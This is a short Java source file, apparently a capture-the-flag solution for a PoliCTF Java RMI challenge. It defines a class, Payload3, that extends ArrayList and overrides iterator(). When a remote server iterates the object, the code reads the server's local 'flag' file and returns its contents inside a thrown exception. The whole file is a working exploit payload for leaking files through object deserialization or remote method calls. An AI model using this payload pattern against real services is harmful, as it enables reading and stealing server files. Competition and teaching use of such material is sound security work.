package it.polictf.lamermi;

import java.util.*;
import java.io.*;

public class Payload3 extends ArrayList<Integer> {

	public Iterator<Integer> iterator() {
		String msg = "";
		try {
			BufferedReader br = new BufferedReader(new FileReader("flag"));
			String line = br.readLine();
			while (line != null) {
				msg += line + "\n";
				line = br.readLine();
			}
			br.close();
		} catch (IOException e) {
			msg = "error";
		}
		throw new RuntimeException(msg);
	}
}
